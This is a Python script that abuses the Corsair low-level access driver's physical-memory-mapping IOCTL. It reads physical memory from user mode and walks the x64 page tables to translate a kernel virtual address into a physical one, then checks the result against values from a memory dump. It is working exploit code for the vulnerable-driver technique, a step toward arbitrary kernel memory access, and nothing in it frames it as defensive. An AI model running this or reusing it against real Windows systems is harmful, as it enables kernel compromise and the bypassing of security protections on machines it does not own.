import ctypes
import struct

# Data from fresh dump
DIRBASE = 0x1AE000
TARGET_VA = 0xfffff805810d7190
EXPECTED_PA = 0x11ebb2190

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000
PTE_PHYS_MASK = 0x000FFFFFFFFFF000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa &= ~0xFFF
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def read8(h, pa):
    v = map_page(h, pa & ~0xFFF)
    if not v: return None
    val = struct.unpack("<Q", bytes((ctypes.c_ubyte * 8).from_address(v + (pa & 0xFFF))))[0]
    # We don't unmap to avoid 0x4E
    return val

def kva_to_pa(h, kva, cr3):
    print(f"[*] Starting walk for 0x{kva:X} with CR3 0x{cr3:X}")
    idxs = [(kva >> 39) & 0x1FF, (kva >> 30) & 0x1FF, (kva >> 21) & 0x1FF, (kva >> 12) & 0x1FF]
    
    # PML4
    pml4e_pa = (cr3 & PTE_PHYS_MASK) + idxs[0] * 8
    pml4e = read8(h, pml4e_pa)
    if pml4e is None:
        print("[-] PML4 read failed")
        return None
    print(f"[+] PML4E [0x{idxs[0]:X}] = 0x{pml4e:X} at PA 0x{pml4e_pa:X}")
    if not (pml4e & 1): 
        print("[-] PML4E not present")
        return None
        
    # PDPT
    pdpe_pa = (pml4e & PTE_PHYS_MASK) + idxs[1] * 8
    pdpe = read8(h, pdpe_pa)
    if pdpe is None:
        print("[-] PDPE read failed")
        return None
    print(f"[+] PDPE  [0x{idxs[1]:X}] = 0x{pdpe:X} at PA 0x{pdpe_pa:X}")
    if not (pdpe & 1): 
        print("[-] PDPE not present")
        return None
    if pdpe & 0x80: # 1GB page
        return (pdpe & 0x000FFFFFC0000000) + (kva & 0x3FFFFFFF)

    # PD
    pde_pa = (pdpe & PTE_PHYS_MASK) + idxs[2] * 8
    pde = read8(h, pde_pa)
    if pde is None:
        print("[-] PDE read failed")
        return None
    print(f"[+] PDE   [0x{idxs[2]:X}] = 0x{pde:X} at PA 0x{pde_pa:X}")
    if not (pde & 1): 
        print("[-] PDE not present")
        return None
    if pde & 0x80: # 2MB page
        return (pde & 0x000FFFFFFFE00000) + (kva & 0x1FFFFF)

    # PT
    pte_pa = (pde & PTE_PHYS_MASK) + idxs[3] * 8
    pte = read8(h, pte_pa)
    if pte is None:
        print("[-] PTE read failed")
        return None
    print(f"[+] PTE   [0x{idxs[3]:X}] = 0x{pte:X} at PA 0x{pte_pa:X}")
    if not (pte & 1): 
        print("[-] PTE not present")
        return None
        
    pa = (pte & PTE_PHYS_MASK) + (kva & 0xFFF)
    print(f"[+] Final PA: 0x{pa:X}")
    return pa

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    pa = kva_to_pa(h, TARGET_VA, DIRBASE)
    if pa:
        if pa == EXPECTED_PA:
            print("[+] MATCH! Translation is correct.")
        else:
            print(f"[!] MISMATCH! Expected 0x{EXPECTED_PA:X}, got 0x{pa:X}")
    
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
